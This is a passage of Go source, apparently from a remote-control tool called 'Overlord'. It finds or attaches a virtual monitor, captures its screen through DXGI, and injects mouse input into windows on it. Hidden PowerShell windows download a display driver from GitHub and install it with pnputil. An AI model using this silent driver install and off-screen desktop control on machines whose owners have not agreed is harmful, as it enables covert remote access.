		var adapter *idxgiAdapter1
		hr := factory.EnumAdapters1(uint32(adapterIndex), &adapter)
		if hr == dxgiErrorNotFound {
			break
		}
		if hr != S_OK || adapter == nil {
			continue
		}

		var desc1 dxgiAdapterDesc1
		_ = adapter.GetDesc1(&desc1)
		descStr := windows.UTF16ToString(desc1.Description[:])
		descLower := strings.ToLower(descStr)

		isVirtual := (desc1.Flags&dxgiAdapterFlagSoftware) != 0 ||
			strings.Contains(descLower, "virtual") ||
			strings.Contains(descLower, "mttvdd") ||
			strings.Contains(descLower, "indirect") ||
			strings.Contains(descLower, "idd")

		if !isVirtual {
			isVirtual = desc1.DedicatedVideoMemory == 0 &&
				desc1.DedicatedSystemMemory == 0 &&
				desc1.SharedSystemMemory == 0
		}

		for outputIndex := 0; ; outputIndex++ {
			var output *idxgiOutput
			hrOut := adapter.EnumOutputs(uint32(outputIndex), &output)
			if hrOut == dxgiErrorNotFound {
				break
			}
			if hrOut != S_OK || output == nil {
				continue
			}

			var outDesc dxgiOutputDesc
			_ = output.GetDesc(&outDesc)
			name := windows.UTF16ToString(outDesc.DeviceName[:])
			coords := image.Rect(
				int(outDesc.DesktopCoordinates.left),
				int(outDesc.DesktopCoordinates.top),
				int(outDesc.DesktopCoordinates.right),
				int(outDesc.DesktopCoordinates.bottom),
			)

			attached := outDesc.AttachedToDesktop != 0

			if isVirtual && attached && coords.Dx() > 0 && coords.Dy() > 0 {
				log.Printf("virtual: found virtual monitor %q adapter=%q bounds=%v flags=0x%x",
					name, descStr, coords, desc1.Flags)
				if fallbackOutput != nil {
					fallbackOutput.Release()
				}
				if fallbackAdapter != nil {
					fallbackAdapter.Release()
				}
				adapter.Release()
				return name, coords, nil
			}

			if isVirtual && !attached && fallbackName == "" {
				fallbackName = name
				if fallbackAdapter != nil {
					fallbackAdapter.Release()
				}
				fallbackAdapter = adapter
				adapter = nil
				if fallbackOutput != nil {
					fallbackOutput.Release()
				}
				fallbackOutput = output
				output = nil
				log.Printf("virtual: found disconnected virtual monitor %q adapter=%q - will try to enable",
					name, descStr)
			}

			if output != nil {
				output.Release()
			}
		}
		if adapter != nil {
			adapter.Release()
		}
	}

	if fallbackName != "" && fallbackOutput != nil && fallbackAdapter != nil {
		fallbackOutput.Release()
		fallbackAdapter.Release()
		log.Printf("virtual: virtual monitor found but disconnected; attempting to attach it")
		enableFirstVirtualDisplay()
		time.Sleep(2 * time.Second)

		return findVirtualMonitor()
	}

	name, coords := findVirtualMonitorByDeviceID(factory)
	if name != "" {
		return name, coords, nil
	}

	return "", image.Rectangle{}, fmt.Errorf("no virtual monitor adapter found")
}

func findVirtualMonitorByDeviceID(factory *idxgiFactory1) (string, image.Rectangle) {
	procEnumDisplayDevices := user32.NewProc("EnumDisplayDevicesW")

	type displayDevice struct {
		cb           uint32
		DeviceName   [32]uint16
		DeviceString [128]uint16
		StateFlags   uint32
		DeviceID     [128]uint16
		DeviceKey    [128]uint16
	}

	virtualNames := make(map[string]bool)
	for i := 0; i < 128; i++ {
		var dd displayDevice
		dd.cb = uint32(unsafe.Sizeof(dd))
		ret, _, _ := procEnumDisplayDevices.Call(0, uintptr(i), uintptr(unsafe.Pointer(&dd)), 0)
		if ret == 0 {
			break
		}
		deviceID := strings.ToLower(syscall.UTF16ToString(dd.DeviceID[:]))
		if strings.Contains(deviceID, "root") || strings.Contains(deviceID, "mttvdd") || strings.Contains(deviceID, "virtual") {
			name := syscall.UTF16ToString(dd.DeviceName[:])
			virtualNames[name] = true
			log.Printf("virtual: identified virtual display device %q (deviceID=%s)", name, deviceID)
		}
	}

	if len(virtualNames) == 0 {
		return "", image.Rectangle{}
	}

	for adapterIndex := 0; ; adapterIndex++ {
		var adapter *idxgiAdapter1
		hr := factory.EnumAdapters1(uint32(adapterIndex), &adapter)
		if hr == dxgiErrorNotFound {
			break
		}
		if hr != S_OK || adapter == nil {
			continue
		}

		for outputIndex := 0; ; outputIndex++ {
			var output *idxgiOutput
			hrOut := adapter.EnumOutputs(uint32(outputIndex), &output)
			if hrOut == dxgiErrorNotFound {
				break
			}
			if hrOut != S_OK || output == nil {
				continue
			}

			var outDesc dxgiOutputDesc
			_ = output.GetDesc(&outDesc)
			name := windows.UTF16ToString(outDesc.DeviceName[:])
			coords := image.Rect(
				int(outDesc.DesktopCoordinates.left),
				int(outDesc.DesktopCoordinates.top),
				int(outDesc.DesktopCoordinates.right),
				int(outDesc.DesktopCoordinates.bottom),
			)

			if virtualNames[name] && outDesc.AttachedToDesktop != 0 && coords.Dx() > 0 && coords.Dy() > 0 {
				log.Printf("virtual: found virtual monitor via device ID: %q bounds=%v", name, coords)
				adapter.Release()
				return name, coords
			}

			output.Release()
		}
		adapter.Release()
	}

	return "", image.Rectangle{}
}

func enableFirstVirtualDisplay() {
	procEnumDisplayDevices := user32.NewProc("EnumDisplayDevicesW")
	procChangeDisplaySettingsEx := user32.NewProc("ChangeDisplaySettingsExW")

	type displayDevice struct {
		cb           uint32
		DeviceName   [32]uint16
		DeviceString [128]uint16
		StateFlags   uint32
		DeviceID     [128]uint16
		DeviceKey    [128]uint16
	}
	const DISPLAY_DEVICE_ACTIVE = 0x00000001
	const DM_POSITION = 0x00000020
	const DM_PELSWIDTH = 0x00080000
	const DM_PELSHEIGHT = 0x00100000

	type devMode struct {
		dmDeviceName          [32]uint16
		dmSpecVersion         uint16
		dmDriverVersion       uint16
		dmSize                uint16
		dmDriverExtra         uint16
		dmFields              uint32
		dmPositionX           int32
		dmPositionY           int32
		dmDisplayOrientation  uint32
		dmDisplayFixedOutput  uint32
		dmColor               int16
		dmDuplex              int16
		dmYResolution         int16
		dmTTOption            int16
		dmCollate             int16
		dmFormName            [32]uint16
		dmLogPixels           uint16
		dmBitsPerPel          uint32
		dmPelsWidth           uint32
		dmPelsHeight          uint32
		dmDisplayFlags        uint32
		dmDisplayFrequency    uint32
		dmDisplayOrientation2 uint32
	}

	for i := 0; ; i++ {
		var dd displayDevice
		dd.cb = uint32(unsafe.Sizeof(dd))
		ret, _, _ := procEnumDisplayDevices.Call(0, uintptr(i), uintptr(unsafe.Pointer(&dd)), 0)
		if ret == 0 {
			break
		}

		deviceID := strings.ToLower(syscall.UTF16ToString(dd.DeviceID[:]))
		isVirtualDevice := strings.Contains(deviceID, "root") || strings.Contains(deviceID, "mttvdd") || strings.Contains(deviceID, "virtual")

		if !isVirtualDevice {
			continue
		}

		name := syscall.UTF16ToString(dd.DeviceName[:])
		log.Printf("virtual: attempting to attach virtual display %q (deviceID=%s)", name, deviceID)

		var dm devMode
		dm.dmSize = uint16(unsafe.Sizeof(dm))
		dm.dmFields = DM_POSITION | DM_PELSWIDTH | DM_PELSHEIGHT
		dm.dmPelsWidth = 1920
		dm.dmPelsHeight = 1080

		const CDS_UPDATEREGISTRY = 0x00000001
		namePtr, _ := syscall.UTF16PtrFromString(name)
		procChangeDisplaySettingsEx.Call(
			uintptr(unsafe.Pointer(namePtr)),
			uintptr(unsafe.Pointer(&dm)),
			0,
			CDS_UPDATEREGISTRY,
			0,
		)
		log.Printf("virtual: attached virtual display %q", name)
		return
	}
}

func installVirtualDriver() error {
	driverURL := os.Getenv(virtualDriverURLEnv)

	tmpDir := filepath.Join(os.TempDir(), virtualDriverDirName)
	if err := os.MkdirAll(tmpDir, 0755); err != nil {
		return fmt.Errorf("create temp dir: %v", err)
	}

	zipPath := filepath.Join(tmpDir, "driver.zip")

	if driverURL == "" {
		driverURL = resolveLatestDriverURL()
		if driverURL == "" {
			log.Printf("virtual: could not resolve latest driver URL. Set %s to a direct download URL.", virtualDriverURLEnv)
			return fmt.Errorf("could not resolve driver URL")
		}
	}

	log.Printf("virtual: downloading virtual display driver from %s", driverURL)

	psCmd := fmt.Sprintf(
		`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%s' -OutFile '%s' -UseBasicParsing`,
		driverURL, zipPath,
	)
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("virtual: download failed: %v (output: %s)", err, string(output))
		return fmt.Errorf("download failed: %v", err)
	}

	extractDir := filepath.Join(tmpDir, "extracted")
	if err := os.MkdirAll(extractDir, 0755); err != nil {
		return fmt.Errorf("create extract dir: %v", err)
	}

	cmd = exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
		fmt.Sprintf(`Expand-Archive -Path '%s' -DestinationPath '%s' -Force`, zipPath, extractDir))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err = cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("extract failed: %v (output: %s)", err, string(output))
	}

	infFiles := findInfFiles(extractDir)
	if len(infFiles) == 0 {
		return fmt.Errorf("no INF file found in extracted driver")
	}

	installed := false
	for _, inf := range infFiles {
		cmd = exec.Command("pnputil", "/add-driver", inf, "/install")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err = cmd.CombinedOutput()
		outStr := string(output)
		installed = installed || strings.Contains(outStr, "Driver package added successfully")
		if err != nil {
			if installed {
				log.Printf("virtual: pnputil install %s completed (exit code %v, already present): %s", inf, err, outStr)
			} else {
				log.Printf("virtual: pnputil install %s: %v (output: %s)", inf, err, outStr)
				continue
			}
		}
	}

	if !installed {
		return fmt.Errorf("no driver INF installed successfully")
	}

	log.Printf("virtual: driver installed, enabling any disabled virtual displays")
	enableDisabledVirtualDisplays()
	return nil
}

func enableDisabledVirtualDisplays() {
	procEnumDisplayDevices := user32.NewProc("EnumDisplayDevicesW")
	procChangeDisplaySettingsEx := user32.NewProc("ChangeDisplaySettingsExW")

	type displayDevice struct {
		cb           uint32
		DeviceName   [32]uint16
		DeviceString [128]uint16
		StateFlags   uint32
		DeviceID     [128]uint16
		DeviceKey    [128]uint16
	}
	const DISPLAY_DEVICE_ACTIVE = 0x00000001
	const DM_POSITION = 0x00000020
	const DM_PELSWIDTH = 0x00080000
	const DM_PELSHEIGHT = 0x00100000

	type devMode struct {
		dmDeviceName          [32]uint16
		dmSpecVersion         uint16
		dmDriverVersion       uint16
		dmSize                uint16
		dmDriverExtra         uint16
		dmFields              uint32
		dmPositionX           int32
		dmPositionY           int32
		dmDisplayOrientation  uint32
		dmDisplayFixedOutput  uint32
		dmColor               int16
		dmDuplex              int16
		dmYResolution         int16
		dmTTOption            int16
		dmCollate             int16
		dmFormName            [32]uint16
		dmLogPixels           uint16
		dmBitsPerPel          uint32
		dmPelsWidth           uint32
		dmPelsHeight          uint32
		dmDisplayFlags        uint32
		dmDisplayFrequency    uint32
		dmDisplayOrientation2 uint32
	}

	found := false
	for i := 0; i < 128; i++ {
		var dd displayDevice
		dd.cb = uint32(unsafe.Sizeof(dd))
		ret, _, _ := procEnumDisplayDevices.Call(0, uintptr(i), uintptr(unsafe.Pointer(&dd)), 0)
		if ret == 0 {
			break
		}

		if dd.StateFlags&DISPLAY_DEVICE_ACTIVE != 0 {
			continue
		}

		deviceID := strings.ToLower(syscall.UTF16ToString(dd.DeviceID[:]))
		isVirtualDevice := strings.Contains(deviceID, "root") || strings.Contains(deviceID, "mttvdd") || strings.Contains(deviceID, "virtual")

		if !isVirtualDevice {
			continue
		}

		name := syscall.UTF16ToString(dd.DeviceName[:])
		log.Printf("virtual: enabling disabled virtual display %q (deviceID=%s)", name, deviceID)

		var dm devMode
		dm.dmSize = uint16(unsafe.Sizeof(dm))
		dm.dmFields = DM_POSITION | DM_PELSWIDTH | DM_PELSHEIGHT
		dm.dmPelsWidth = 1920
		dm.dmPelsHeight = 1080

		const CDS_UPDATEREGISTRY = 0x00000001
		namePtr, _ := syscall.UTF16PtrFromString(name)
		procChangeDisplaySettingsEx.Call(
			uintptr(unsafe.Pointer(namePtr)),
			uintptr(unsafe.Pointer(&dm)),
			0,
			CDS_UPDATEREGISTRY,
			0,
		)
		found = true
		log.Printf("virtual: enabled virtual display %q", name)
		break
	}
	if found {
		time.Sleep(3 * time.Second)
	}
}

func resolveLatestDriverURL() string {
	apiURL := "https://api.github.com/repos/VirtualDrivers/Virtual-Display-Driver/releases/latest"
	psCmd := fmt.Sprintf(
		`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $headers = @{'User-Agent'='Overlord'}; try { $r = Invoke-RestMethod -Uri '%s' -Headers $headers -TimeoutSec 15; $r.assets | Where-Object { $_.name -like '*Driver.Only.zip' -and $_.name -notlike '*ARM64*' -and $_.name -notlike '*VirtualAudio*' } | Select-Object -First 1 -ExpandProperty browser_download_url } catch { '' }`,
		apiURL,
	)
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("virtual: GitHub API request failed: %v", err)
		return ""
	}
	url := strings.TrimSpace(string(output))
	if url == "" {
		log.Printf("virtual: no matching driver asset found in GitHub release")
		return ""
	}
	return url
}

func findInfFiles(dir string) []string {
	var infs []string
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() && strings.EqualFold(filepath.Ext(path), ".inf") {
			infs = append(infs, path)
		}
		return nil
	})
	return infs
}

func (s *virtualDuplicationState) capture() (*image.RGBA, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if err := s.ensure(); err != nil {
		s.lastFail = time.Now()
		return nil, err
	}

	var info dxgiOutDuplFrameInfo
	var resource *iunknown
	waitMs := uint32(5)
	hr := uintptr(0)
	for {
		hr = s.dup.AcquireNextFrame(waitMs, &info, &resource)
		if hr != dxgiErrorWaitTimeout {
			break
		}
		if s.lastBase != nil {
			width := int(s.desc.ModeDesc.Width)
			height := int(s.desc.ModeDesc.Height)
			img := s.composeFrame(s.lastBase, width, height)
			if img == s.lastBase {
				img = cloneRGBA(img)
			}
			s.lastFrameAt = time.Now()
			return img, nil
		}
		if s.lastFrame != nil {
			return cloneRGBA(s.lastFrame), nil
		}
		if waitMs >= 50 {
			return nil, errors.New("virtual dxgi: frame timeout")
		}
		waitMs = 50
	}
	if hr == dxgiErrorAccessLost {
		s.close()
		return nil, errors.New("virtual dxgi: access lost")
	}
	if hr == dxgiErrorDeviceRemoved || hr == dxgiErrorDeviceReset {
		s.close()
		return nil, fmt.Errorf("virtual dxgi: device lost 0x%x", hr)
	}
	if hr != S_OK {
		return nil, fmt.Errorf("virtual dxgi: acquire frame failed 0x%x", hr)
	}
	if resource != nil {
		defer resource.Release()
	}

	width := int(s.desc.ModeDesc.Width)
	height := int(s.desc.ModeDesc.Height)
	if width <= 0 || height <= 0 {
		_ = s.dup.ReleaseFrame()
		return nil, errors.New("virtual dxgi: invalid frame size")
	}

	var img *image.RGBA
	userScale := effectiveScale(width, height)
	dstW := int(float64(width) * userScale)
	dstH := int(float64(height) * userScale)
	wantScale := userScale != 1 && dstW > 0 && dstH > 0 && (dstW != width || dstH != height)

	if s.desc.DesktopImageInSystemMemory != 0 {
		var mapped dxgiMappedRect
		hr = s.dup.MapDesktopSurface(&mapped)
		if hr != S_OK {
			_ = s.dup.ReleaseFrame()
			return nil, fmt.Errorf("virtual dxgi: map desktop surface failed 0x%x", hr)
		}
		dup := s.dup
		defer func() {
			_ = dup.UnMapDesktopSurface()
			_ = dup.ReleaseFrame()
		}()

		if mapped.Pitch <= 0 || mapped.Bits == nil {
			return nil, errors.New("virtual dxgi: invalid mapped surface")
		}

		pitch := int(mapped.Pitch)
		if pitch < width*4 {
			return nil, fmt.Errorf("virtual dxgi: pitch %d too small for width %d", pitch, width)
		}
		totalBytes := pitch * height
		if totalBytes/height != pitch {
			return nil, fmt.Errorf("virtual dxgi: pitch*height overflow (%d * %d)", pitch, height)
		}
		src := unsafe.Slice(mapped.Bits, totalBytes)
		if wantScale {
			img = convertBGRAScaled(src, pitch, width, height, dstW, dstH, s.desc.Rotation)
		}
		if img == nil {
			img = convertBGRA(src, pitch, width, height, s.desc.Rotation)
		}
		if img == nil {
			return nil, errors.New("virtual dxgi: pixel conversion failed")
		}
	} else {
		img, hr = s.readbackFrame(width, height, s.desc.Rotation, resource,
			wantScale, dstW, dstH)
		_ = s.dup.ReleaseFrame()
		if hr != S_OK || img == nil {
			return nil, fmt.Errorf("virtual dxgi: staging readback failed 0x%x", hr)
		}
	}

	captured := img
	s.copyLastBase(captured)
	img = s.composeFrame(captured, width, height)
	if img != captured {
		PutRGBA(captured)
	}
	if img == s.lastBase {
		img = cloneRGBA(img)
	}
	s.lastFrame = nil
	s.lastFrameAt = time.Now()

	return img, nil
}

func (s *virtualDuplicationState) ensure() error {
	dxgiComInit.Do(func() {
		const coinitMultithreaded = 0x0
		hr, _, _ := procCoInitDXGI.Call(0, coinitMultithreaded)
		if hr != S_OK && hr != 1 {
			log.Printf("virtual: CoInitializeEx for DXGI failed: 0x%x", hr)
		}
	})

	if s.dup != nil {
		const dxgiDeviceMaxAge = 4 * time.Hour
		if !s.createdAt.IsZero() && time.Since(s.createdAt) > dxgiDeviceMaxAge {
			log.Printf("virtual: dxgi device age exceeded; forcing re-init")
			s.close()
		} else {
			return nil
		}
	} else {
		s.close()
	}

	virtualMu.Lock()
	bounds := virtualMonitorBounds
	monName := virtualMonitorName
	virtualMu.Unlock()

	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		return errors.New("virtual dxgi: no virtual monitor bounds")
	}

	factory, err := createDXGIFactory1()
	if err != nil {
		return err
	}

	for adapterIndex := 0; ; adapterIndex++ {
		var adapter *idxgiAdapter1
		hr := factory.EnumAdapters1(uint32(adapterIndex), &adapter)
		if hr == dxgiErrorNotFound {
			break
		}
		if hr != S_OK || adapter == nil {
			continue
		}

		for outputIndex := 0; ; outputIndex++ {
			var output *idxgiOutput
			hrOut := adapter.EnumOutputs(uint32(outputIndex), &output)
			if hrOut == dxgiErrorNotFound {
				break
			}
			if hrOut != S_OK || output == nil {
				continue
			}

			var desc dxgiOutputDesc
			_ = output.GetDesc(&desc)
			name := windows.UTF16ToString(desc.DeviceName[:])
			coords := image.Rect(
				int(desc.DesktopCoordinates.left),
				int(desc.DesktopCoordinates.top),
				int(desc.DesktopCoordinates.right),
				int(desc.DesktopCoordinates.bottom),
			)

			if coords.Eq(bounds) && desc.AttachedToDesktop != 0 {
				device, context, err := createD3DDevice(adapter)
				if err != nil {
					output.Release()
					adapter.Release()
					factory.Release()
					return err
				}

				var output1 *idxgiOutput1
				hrQ := (*iunknown)(unsafe.Pointer(output)).QueryInterface(&IID_IDXGIOutput1, unsafe.Pointer(&output1))
				if hrQ != S_OK || output1 == nil {
					context.Release()
					device.Release()
					output.Release()
					adapter.Release()
					factory.Release()
					return errors.New("virtual dxgi: failed to query IDXGIOutput1")
				}

				var dup *idxgiOutputDuplication
				hrD := output1.DuplicateOutput((*iunknown)(unsafe.Pointer(device)), &dup)
				if hrD != S_OK || dup == nil {
					output1.Release()
					context.Release()
					device.Release()
					output.Release()
					adapter.Release()
					factory.Release()
					return fmt.Errorf("virtual dxgi: DuplicateOutput failed 0x%x", hrD)
				}

				var dupDesc dxgiOutDuplDesc
				_ = dup.GetDesc(&dupDesc)

				s.factory = factory
				s.adapter = adapter
				s.output = output
				s.output1 = output1
				s.device = device
				s.context = context
				s.dup = dup
				s.desc = dupDesc
				s.outputName = name
				s.bounds = bounds
				s.createdAt = time.Now()

				log.Printf("virtual: dxgi duplication initialized for virtual monitor %q bounds=%v", name, bounds)
				return nil
			}
			output.Release()
		}
		adapter.Release()
	}

	factory.Release()
	return fmt.Errorf("virtual dxgi: virtual monitor output not found for bounds=%v name=%q", bounds, monName)
}

func (s *virtualDuplicationState) close() {
	if s.dup != nil {
		s.dup.Release()
		s.dup = nil
	}
	if s.staging != nil {
		s.staging.Release()
		s.staging = nil
	}
	if s.h264LastTex != nil {
		s.h264LastTex.Release()
		s.h264LastTex = nil
		s.h264LastDesc = d3d11Texture2DDesc{}
	}
	if s.context != nil {
		s.context.Release()
		s.context = nil
	}
	if s.output1 != nil {
		s.output1.Release()
		s.output1 = nil
	}
	if s.output != nil {
		s.output.Release()
		s.output = nil
	}
	if s.adapter != nil {
		s.adapter.Release()
		s.adapter = nil
	}
	if s.factory != nil {
		s.factory.Release()
		s.factory = nil
	}
	if s.device != nil {
		s.device.Release()
		s.device = nil
	}
	s.outputName = ""
	s.bounds = image.Rectangle{}
	PutRGBA(s.lastBase)
	s.lastBase = nil
	PutRGBA(s.lastFrame)
	s.lastFrame = nil
	s.lastFrameAt = time.Time{}
	s.createdAt = time.Time{}
}

func (s *virtualDuplicationState) composeFrame(base *image.RGBA, nativeW, nativeH int) *image.RGBA {
	if base == nil {
		return nil
	}
	imgW := base.Bounds().Dx()
	imgH := base.Bounds().Dy()
	userScale := effectiveScale(nativeW, nativeH)
	withCursor := virtualCursorEnabled

	dstW := int(float64(nativeW) * userScale)
	dstH := int(float64(nativeH) * userScale)
	alreadyScaled := (imgW == dstW && imgH == dstH) && (imgW != nativeW || imgH != nativeH)
	if !withCursor && (userScale == 1 || alreadyScaled) {
		return base
	}

	img := base
	if withCursor {
		img = s.ensureCursorScratch(base.Rect)
		copy(img.Pix, base.Pix)
	}
	bounds := s.bounds
	if bounds.Dx() != int(s.desc.ModeDesc.Width) || bounds.Dy() != int(s.desc.ModeDesc.Height) {
		bounds = image.Rect(bounds.Min.X, bounds.Min.Y, bounds.Min.X+int(s.desc.ModeDesc.Width), bounds.Min.Y+int(s.desc.ModeDesc.Height))
	}
	if withCursor {
		drawCursorRotated(img, bounds, bounds, s.desc.Rotation)
	}

	if !alreadyScaled && dstW > 0 && dstH > 0 && (dstW != imgW || dstH != imgH) {
		img = resizeNearest(img, dstW, dstH)
	}
	return img
}

func (s *virtualDuplicationState) ensureCursorScratch(rect image.Rectangle) *image.RGBA {
	return image.NewRGBA(rect)
}

func (s *virtualDuplicationState) copyLastBase(src *image.RGBA) {
	if src == nil {
		PutRGBA(s.lastBase)
		s.lastBase = nil
		return
	}
	width := src.Rect.Dx()
	height := src.Rect.Dy()
	need := len(src.Pix)
	if s.lastBase != nil && cap(s.lastBase.Pix) >= need && cap(s.lastBase.Pix) <= need*2 {
		s.lastBase.Pix = s.lastBase.Pix[:need]
		s.lastBase.Stride = width * 4
		s.lastBase.Rect = image.Rect(0, 0, width, height)
		copy(s.lastBase.Pix, src.Pix)
		return
	}
	PutRGBA(s.lastBase)
	s.lastBase = cloneRGBA(src)
}

func (s *virtualDuplicationState) readbackFrame(width, height int, rotation uint32, resource *iunknown,
	wantScale bool, dstW, dstH int) (*image.RGBA, uintptr) {
	if resource == nil || s.device == nil || s.context == nil {
		return nil, uintptr(1)
	}
	var tex *d3d11Texture2D
	hr := resource.QueryInterface(&IID_ID3D11Texture2D, unsafe.Pointer(&tex))
	if hr != S_OK || tex == nil {
		return nil, hr
	}
	defer tex.Release()

	var srcDesc d3d11Texture2DDesc
	tex.GetDesc(&srcDesc)
	if srcDesc.Width == 0 || srcDesc.Height == 0 {
		return nil, uintptr(1)
	}

	if s.staging == nil || s.stagingDesc.Width != srcDesc.Width || s.stagingDesc.Height != srcDesc.Height || s.stagingDesc.Format != srcDesc.Format {
		if s.staging != nil {
			s.staging.Release()
			s.staging = nil
		}
		stagingDesc := srcDesc
		stagingDesc.Usage = d3d11UsageStaging
		stagingDesc.BindFlags = 0
		stagingDesc.CPUAccessFlags = d3d11CpuAccessRead
		stagingDesc.MiscFlags = 0
		stagingDesc.MipLevels = 1
		stagingDesc.ArraySize = 1
		stagingDesc.SampleDesc.Count = 1
		stagingDesc.SampleDesc.Quality = 0
		var staging *d3d11Texture2D
		hr = s.device.CreateTexture2D(&stagingDesc, nil, &staging)
		if hr != S_OK || staging == nil {
			return nil, hr
		}
		s.staging = staging
		s.stagingDesc = stagingDesc
	}

	s.context.CopyResource(s.staging, tex)
	var mapped d3d11MappedSubresource
	hr = s.context.Map(s.staging, 0, d3d11MapRead, 0, &mapped)
	if hr != S_OK {
		return nil, hr
	}
	defer s.context.Unmap(s.staging, 0)
	if mapped.Data == nil || mapped.RowPitch == 0 {
		return nil, uintptr(1)
	}

	pitch := int(mapped.RowPitch)
	srcH := int(srcDesc.Height)
	srcW := int(srcDesc.Width)
	if pitch < srcW*4 {
		return nil, uintptr(1)
	}
	totalBytes := pitch * srcH
	if totalBytes/srcH != pitch {
		return nil, uintptr(1)
	}
	src := unsafe.Slice((*byte)(mapped.Data), totalBytes)
	var img *image.RGBA
	if wantScale {
		img = convertBGRAScaled(src, pitch, int(srcDesc.Width), int(srcDesc.Height), dstW, dstH, rotation)
	}
	if img == nil {
		img = convertBGRA(src, pitch, int(srcDesc.Width), int(srcDesc.Height), rotation)
	}

	return img, S_OK
}

func SetVirtualCursorCapture(enabled bool) {
	virtualCursorEnabled = enabled
}

func VirtualInputMouseMove(x, y int32) error {
	virtualMu.Lock()
	bounds := virtualMonitorBounds
	virtualMu.Unlock()

	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		virtualInputMu.Lock()
		virtualLastCursor = point{x: x, y: y}
		virtualHasCursor = true
		virtualInputMu.Unlock()
		return nil
	}

	if bits := virtualLastScale.Load(); bits != 0 {
		if s := math.Float64frombits(bits); s > 0 && s < 1 {
			x = int32(float64(x) / s)
			y = int32(float64(y) / s)
		}
	}

	absX := bounds.Min.X + int(x)
	absY := bounds.Min.Y + int(y)
	if absX < bounds.Min.X {
		absX = bounds.Min.X
	}
	if absY < bounds.Min.Y {
		absY = bounds.Min.Y
	}
	if absX >= bounds.Max.X {
		absX = bounds.Max.X - 1
	}
	if absY >= bounds.Max.Y {
		absY = bounds.Max.Y - 1
	}

	virtualInputMu.Lock()
	virtualLastCursor = point{x: int32(absX), y: int32(absY)}
	virtualHasCursor = true
	virtualInputMu.Unlock()
	moveVirtualWindowIfDragging(point{x: int32(absX), y: int32(absY)})
	resizeVirtualWindowIfDragging(point{x: int32(absX), y: int32(absY)})

	pt := point{x: int32(absX), y: int32(absY)}
	hitHwnd := windowFromPoint(pt)
	if hitHwnd != 0 {
		root := rootWindow(hitHwnd)
		prevWorking := virtualGetWorkingWindow()
		virtualRememberWorkingWindow(hitHwnd)
		prevRoot := rootWindow(prevWorking)
		if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
			procSetForegroundWindow.Call(root)
			procSetActiveWindow.Call(root)
			procSetFocus.Call(hitHwnd)
		}

		clientPt := pt
		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
		procPostMessageW.Call(hitHwnd, WM_MOUSEMOVE, uintptr(virtualCurrentMouseButtons()), makeLParam(clientPt.x, clientPt.y))
	}
	return nil
}

func VirtualInputMouseDown(button int) error {
	pt := virtualCurrentCursor()

	virtualSetMouseButton(button, true)

	hitHwnd := windowFromPoint(pt)
	if hitHwnd == 0 {
		return nil
	}

	root := rootWindow(hitHwnd)
	prevWorking := virtualGetWorkingWindow()
	virtualRememberWorkingWindow(hitHwnd)

	prevRoot := rootWindow(prevWorking)
	if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
		procSetForegroundWindow.Call(root)
		procSetActiveWindow.Call(root)
		procSetFocus.Call(hitHwnd)
	}

	if button == 0 {
		lparam := makeLParam(pt.x, pt.y)
		ncHwnd := rootWindow(hitHwnd)
		hitTest := safeNCHitTest(ncHwnd, lparam)

		if hitTest != HTCLIENT && hitTest != 0 {
			if hitTest == HTCLOSE {
				return nil
			}

			if hitTest == HTCAPTION {
				var r rect
				if ok, _, _ := procGetWindowRect.Call(ncHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
					virtualInputMu.Lock()
					virtualMovingWindow = true
					virtualWindowToMove = ncHwnd
					virtualMoveOffset = point{x: pt.x - r.left, y: pt.y - r.top}
					virtualWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
					virtualInputMu.Unlock()
				}
				return nil
			}
			if isVirtualResizeHit(hitTest) {
				var r rect
				if ok, _, _ := procGetWindowRect.Call(ncHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
					virtualInputMu.Lock()
					virtualResizingWindow = ncHwnd
					virtualResizeHit = hitTest
					virtualResizeStart = pt
					virtualResizeRect = r
					virtualInputMu.Unlock()
				}
				return nil
			}

			if hitTest == HTMAXBUTTON {
				return nil
			}

			if hitTest == HTMINBUTTON {
				return nil
			}
		}
	}

	clientPt := pt
	procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))

	msg := uint32(WM_LBUTTONDOWN)
	wparam := uintptr(MK_LBUTTON)
	switch button {
	case 1:
		msg = WM_MBUTTONDOWN
		wparam = MK_MBUTTON
	case 2:
		msg = WM_RBUTTONDOWN
		wparam = MK_RBUTTON
	}

	procPostMessageW.Call(hitHwnd, uintptr(msg), wparam, makeLParam(clientPt.x, clientPt.y))
	return nil
}

func VirtualInputMouseUp(button int) error {
	pt := virtualCurrentCursor()

	if button == 0 {
		endVirtualWindowDrag(pt)
		endVirtualWindowResize()
	}
	virtualSetMouseButton(button, false)

	hitHwnd := windowFromPoint(pt)
	if hitHwnd == 0 {
		return nil
	}

	if button == 0 {
		lparam := makeLParam(pt.x, pt.y)
		ncHwnd := rootWindow(hitHwnd)
		hitTest := safeNCHitTest(ncHwnd, lparam)

		if hitTest == HTCLOSE {
			procPostMessageW.Call(ncHwnd, WM_CLOSE, 0, 0)
			return nil
		}
		if hitTest == HTMAXBUTTON {
			if isWindowMaximized(ncHwnd) {
				procPostMessageW.Call(ncHwnd, WM_SYSCOMMAND, SC_RESTORE, 0)
			} else {
